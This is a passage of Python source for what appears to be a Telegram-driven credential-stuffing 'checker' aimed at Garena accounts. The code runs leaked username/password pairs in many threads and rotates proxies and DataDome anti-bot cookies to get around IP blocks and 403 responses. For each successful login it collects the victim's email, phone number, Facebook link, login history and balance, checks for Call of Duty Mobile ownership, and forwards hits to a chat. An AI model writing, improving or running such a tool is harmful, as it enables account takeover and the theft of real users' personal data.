    _tlocal.session = sess
    _tlocal.dm      = dm_new
    return sess, dm_new


# ---------------------------------------------------------------------------
#  process_account  —  core per-account checker
#
#  KEY FIX: Replaced the hard MAX_IP_ROTATIONS cap with a smarter strategy:
#   - Track how many times we've cycled through ALL proxies
#   - Keep retrying with fresh proxies + cookies until we've cycled all proxies
#     at least FULL_CYCLE_LIMIT times, with a short backoff between cycles
#   - This eliminates "Max IP rotations — no working proxy/cookie" on large runs
# ---------------------------------------------------------------------------
def process_account(account, password, state):
    """
    Process one account.  Returns a result dict or None if stopped.

    The proxy/cookie rotation strategy:
    - account_attempts:  counts actual credential failures (wrong pw, bad json, etc.)
    - block_rotations:   counts 403 / IP-block events — does NOT cap; keeps rotating
                         until we either succeed or exhaust all proxies FULL_CYCLE_LIMIT times.
    - After every PROXIES_PER_CYCLE rotations, sleep a short backoff to let IPs breathe.
    """
    if state.should_stop():
        return None

    pm = state.proxy_mgr
    cm = state.cookie_mgr
    ls = state.live_stats
    rm = state.results_mgr

    MAX_ACCOUNT_ATTEMPTS = 4     # credential/JSON failures — residential proxies need more headroom
    FULL_CYCLE_LIMIT     = 2     # give up after cycling all proxies this many times
    proxy_count          = pm.count() if (pm and pm.loaded()) else 1
    # Max block rotations = cycle through all proxies FULL_CYCLE_LIMIT times
    MAX_BLOCK_ROTATIONS  = max(30, proxy_count * FULL_CYCLE_LIMIT)

    account_attempts = 0
    block_rotations  = 0

    while account_attempts < MAX_ACCOUNT_ATTEMPTS and block_rotations < MAX_BLOCK_ROTATIONS:
        if state.should_stop():
            return None
        try:
            session, dm = _thread_session(state)

            # Clear per-account auth cookies; re-apply GA + DataDome
            session.cookies.clear()
            init_ga_cookies(session)
            dm.clear_session(session)
            dd = dm.get()
            if dd:
                dm.apply_session(session, dd)
            else:
                cks = cm.get_valid() if cm else []
                if cks:
                    val = random.choice(cks)
                    val = val.split("=", 1)[1] if "=" in val else val
                    dm.set(val)
                    dm.apply_session(session, val)
                else:
                    pd  = dict(session.proxies) or None
                    ndd = get_datadome_cookie(session, proxies=pd)
                    if ndd:
                        dm.set(ndd)
                        dm.apply_session(session, ndd)

            # ── Step 1: prelogin (10 internal retries) ──────────────────────
            v1, v2, new_dd = prelogin(session, account, dm, cm, pm=pm)

            if v1 == "IP_BLOCKED":
                block_rotations += 1
                session, dm = _reset_thread_session(pm, cm)
                # Very short backoff — rotate immediately, only breathe if heavily blocked
                continue

            if v1 == "NO_ACCOUNT":
                if ls:
                    ls.update(valid=False)
                return {
                    "account": account, "password": password,
                    "is_error": False, "valid": False,
                    "error_reason": "Account Does Not Exist",
                }

            if not v1 or not v2:
                # prelogin exhausted retries — rotate and try again, no sleep
                account_attempts += 1
                if account_attempts < MAX_ACCOUNT_ATTEMPTS:
                    session, dm = _reset_thread_session(pm, cm)
                    continue
                if ls:
                    ls.update(is_error=True)
                return {
                    "account": account, "password": password,
                    "is_error": True, "error_reason": "Prelogin Failed",
                }

            if new_dd:
                dm.set(new_dd)
                dm.apply_session(session, new_dd)

            # ── Step 2: login ───────────────────────────────────────────────
            sso = login_account(session, account, password, v1, v2)
            if not sso:
                if ls:
                    ls.update(valid=False)
                return {
                    "account": account, "password": password,
                    "is_error": False, "valid": False, "error_reason": "Wrong Password",
                }
            if isinstance(sso, str) and sso.startswith("permanent_fail:"):
                err_code = sso.split(":", 1)[1]
                if err_code in ("ACCOUNT DOESNT EXIST", "error_no_account"):
                    err_code = "Account Does Not Exist"
                if ls:
                    ls.update(valid=False)
                return {
                    "account": account, "password": password,
                    "is_error": False, "valid": False, "error_reason": err_code,
                }

            # ── Step 3: fetch account info ──────────────────────────────────
            ckd  = session.cookies.get_dict()
            ck_p = [f"{k}={ckd[k]}" for k in (
                "apple_state_key", "datadome", "sso_key",
                "_ga", "_ga_XB5PSHEQB4", "_ga_1M7M9L6VPX",
            ) if k in ckd]
            hdrs = {
                "accept":     "*/*",
                "referer":    "https://account.garena.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                              "Chrome/129.0.0.0 Safari/537.36",
            }
            if ck_p:
                hdrs["cookie"] = "; ".join(ck_p)
            resp = session.get(
                "https://account.garena.com/api/account/init",
                headers=hdrs, timeout=REQ_TIMEOUT,
            )

            if resp.status_code == 403:
                bad = session.cookies.get("datadome") or dm.get()
                if bad and cm:
                    cm.mark_banned(bad)
                # Rotate proxy + cookie immediately — no sleep
                block_rotations += 1
                session, dm = _reset_thread_session(pm, cm)
                continue

            try:
                acct_json = resp.json()
            except Exception:
                account_attempts += 1
                if account_attempts < MAX_ACCOUNT_ATTEMPTS:
                    continue
                if ls:
                    ls.update(is_error=True)
                return {
                    "account": account, "password": password,
                    "is_error": True, "error_reason": "Bad JSON",
                }

            err_in_json = acct_json.get("error", "")
            if err_in_json in ("ACCOUNT DOESNT EXIST", "error_no_account"):
                if ls:
                    ls.update(valid=False)
                return {
                    "account": account, "password": password,
                    "is_error": False, "valid": False,
                    "error_reason": "Account Does Not Exist",
                }
            if err_in_json == "error_auth":
                if ls:
                    ls.update(valid=False)
                return {
                    "account": account, "password": password,
                    "is_error": False, "valid": False, "error_reason": "Auth Error",
                }

            details = parse_account_details(
                acct_json if "user_info" in acct_json else {"user_info": acct_json}
            )

            # ── Step 4: CODM check (isolated session) ───────────────────────
            codm_s = _new_session()
            for ck in ("sso_key", "apple_state_key", "datadome"):
                if ck in session.cookies:
                    codm_s.cookies.set(ck, session.cookies.get(ck), domain=".garena.com")
            has_codm, codm_info = check_codm_account(codm_s)
            try:
                codm_s.close()
            except Exception:
                pass

            # Save fresh datadome back to pool
            fresh = dm.extract(session)
            if fresh and cm:
                cm.save(fresh)

            # ── Build result dict ────────────────────────────────────────────
            mob     = details.get("mobile_no", "N/A")
            cc      = details.get("country_code", "N/A")
            fmt_mob = format_mobile_number(mob, cc)
            em      = details.get("email", "N/A")
            ev      = details.get("email_verified", False)
            em_d    = (
                f"{em} ({'Verified' if ev else 'Not Verified'})"
                if em and em != "N/A" and "@" in em else "N/A"
            )
            fb_un   = details.get("fb_username", "N/A")
            fb_uid  = details.get("fb_uid", "N/A")
            fb_info = ("NOT CONNECTED" if not fb_uid or fb_uid == "N/A"
                       else ("FB UNBIND or DELETED" if not fb_un or fb_un == "N/A"
                             else "CONNECTED"))
            lh      = details.get("login_history", [])
            li0     = lh[0] if lh else {}
            ll_ts   = li0.get("timestamp", 0)
            ll_date = (
                time.strftime("%B %d, %Y | %I:%M %p", time.localtime(ll_ts))
                if ll_ts else "N/A"
            )
            ll_where = li0.get("source", "Unknown") if li0 else "Unknown"

            ad = {
                "account":          account,
                "password":         password,
                "uid":              details.get("uid", "N/A"),
                "username":         details.get("username", "N/A"),
                "nickname":         details.get("nickname", "N/A"),
                "email_display":    em_d,
                "formatted_mobile": fmt_mob,
                "country":          details.get("country", "N/A"),
                "shell_balance":    details.get("shell_balance", 0),
                "fb_info":          fb_info,
                "is_clean":         details.get("is_clean", False),
                "has_codm":         has_codm,
                "is_error":         False,
                "valid":            True,
                "last_login_date":  ll_date,
                "last_login_where": ll_where,
                "codm_level":       0,
                "codm_region":      "N/A",
                "codm_nickname":    "N/A",
                "codm_uid":         "N/A",
            }
            if has_codm and codm_info:
                ad.update({
                    "codm_level":    int(codm_info.get("codm_level", 0) or 0),
                    "codm_region":   codm_info.get("region", "N/A"),
                    "codm_nickname": codm_info.get("codm_nickname", "N/A"),
                    "codm_uid":      codm_info.get("uid", "N/A"),
                })

            if rm:
                rm.add(ad)
            if ls:
                ls.update(
                    valid=True, clean=ad["is_clean"], has_codm=has_codm,
                    codm_level=ad["codm_level"], shell=ad["shell_balance"],
                    region=ad["codm_region"],
                )
            return ad

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            # Network error → rotate proxy + brief jitter so residential IP can breathe
            block_rotations += 1
            session, dm = _reset_thread_session(pm, cm)
            time.sleep(random.uniform(0.5, 2.0))
            continue
        except Exception as e:
            account_attempts += 1
            if account_attempts < MAX_ACCOUNT_ATTEMPTS:
                time.sleep(random.uniform(0.3, 1.0))
                continue
            if ls:
                ls.update(is_error=True)
            return {
                "account": account, "password": password,
                "is_error": True, "error_reason": str(e)[:60],
            }

    # Exhausted both caps
    if ls:
        ls.update(is_error=True)
    if block_rotations >= MAX_BLOCK_ROTATIONS:
        reason = f"Blocked — tried {block_rotations} proxy rotations, no working proxy/cookie"
    else:
        reason = "Max credential retries exceeded"
    return {"account": account, "password": password, "is_error": True, "error_reason": reason}


# ---------------------------------------------------------------------------
#  Cookie pre-warm
# ---------------------------------------------------------------------------
def prewarm_cookies(count, pm, cm):
    """
    Fetch DataDome cookies in a background daemon thread so the checker
    starts immediately without waiting. Threads pick up pool cookies as
    they become available; initial accounts use the prelogin 403-handler
    to get cookies on demand (throttled to 5 concurrent fetches).
    """
    already = cm.count() if cm else 0
    needed  = max(0, count - already)
    if needed <= 0:
        return

    def _fetch_one(_):
        try:
            sess = _new_session()
            if pm and pm.loaded():
                px = pm.get_next()
                if px:
                    sess.proxies.update(px)
            init_ga_cookies(sess)
            pd = dict(sess.proxies) or None
            dd = _fetch_datadome_throttled(sess, proxies=pd)
            if dd and cm:
                cm.save(dd)
            try:
                sess.close()
            except Exception:
                pass
        except Exception:
            pass

    def _bg():
        workers = min(needed, 10)
        with ThreadPoolExecutor(max_workers=workers, thread_name_prefix="prewarm") as ex:
            list(ex.map(_fetch_one, range(needed)))

    # Run in background — checker starts immediately, no blocking wait
    Thread(target=_bg, daemon=True, name="prewarm").start()


# ---------------------------------------------------------------------------
#  run_check  —  drives the ThreadPoolExecutor loop
# ---------------------------------------------------------------------------
def run_check(item, accounts, state, bot_send_hit_fn, bot_send_final_fn,
              bot_send_result_files_fn, log_terminal_fn, process_next_fn):
    """
    Run the full check for `accounts`.

    Parameters
    ----------
    item                  : QueueItem
    accounts              : list of (account, password) tuples
    state                 : BotState instance
    bot_send_hit_fn       : callable(chat_id, result_dict)
    bot_send_final_fn     : callable(chat_id, ls, stopped)
    bot_send_result_files_fn : callable(chat_id, rm)
    log_terminal_fn       : callable(result_dict)
    process_next_fn       : callable() — processes next item in queue
    """
    ls      = state.live_stats
    pm      = state.proxy_mgr
    stop_ev = state.stop_event
    chat_id = item.chat_id
    threads = item.threads
    rm      = state.results_mgr

    _tlocal.__dict__.clear()
    logger.info(f"[CHECK] {item.combo_name} | {len(accounts)} accs | {threads} threads")

    cm = state.cookie_mgr
    # Pre-warm enough cookies so threads don't all block at startup simultaneously
    prewarm_cookies(min(threads, 25), pm, cm)

    try:
        with ThreadPoolExecutor(max_workers=threads, thread_name_prefix="checker") as executor:
            # Submit all accounts upfront for maximum parallelism
            pending = set()
            for acc, pwd in accounts:
                if stop_ev.is_set():
                    break
                pending.add(executor.submit(process_account, acc, pwd, state))

            # Poll loop: check stop_ev every 0.3 s so /stop exits within ~300 ms
            while pending and not stop_ev.is_set():
                done_futs, pending = _cf.wait(
                    pending, timeout=0.3, return_when=_cf.FIRST_COMPLETED
                )
                for future in done_futs:
                    try:
                        result = future.result(timeout=45)
                        if result:
                            log_terminal_fn(result)
                            if result.get("has_codm"):
                                try:
                                    bot_send_hit_fn(chat_id, result)
                                except Exception:
                                    pass
                    except Exception as e:
                        logger.debug(f"Future exception: {e}")

            # Stop triggered — cancel all queued (not yet started) futures immediately
            if stop_ev.is_set():
                for f in pending:
                    f.cancel()

    except Exception as e:
        logger.error(f"[CHECK CRASH] {e}", exc_info=True)
    finally:
        stopped = stop_ev.is_set()
        state.finish()
        bot_send_final_fn(chat_id, ls, stopped)

        if rm:
            try:
                bot_send_result_files_fn(chat_id, rm)
            except Exception as e:
                logger.error(f"[RESULT FILES] {e}")

        process_next_fn()
